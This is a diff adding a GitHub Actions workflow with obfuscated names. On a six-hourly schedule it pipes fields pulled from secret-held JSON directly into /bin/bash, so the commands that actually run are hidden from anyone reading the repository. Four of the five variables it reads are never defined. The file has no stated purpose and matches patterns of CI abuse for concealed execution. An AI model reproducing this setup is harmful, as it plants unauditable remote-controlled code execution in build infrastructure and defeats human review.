@@ -1,0 +1,22 @@
+name: zhoubozou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhoubozou
+        env:
+          exep4225: ${{ secrets.exep4225 }}
+        run: |
+          echo $exep4225 | jq -r .nd3 | /bin/bash
+          echo $vtlz9779 | jq -r .h4657 | /bin/bash
+          echo $je0144 | jq -r .gmb27 | /bin/bash
+          echo $gvepg5 | jq -r .c696 | /bin/bash
+          echo $rtkd642 | jq -r .sv85 | /bin/bash
+
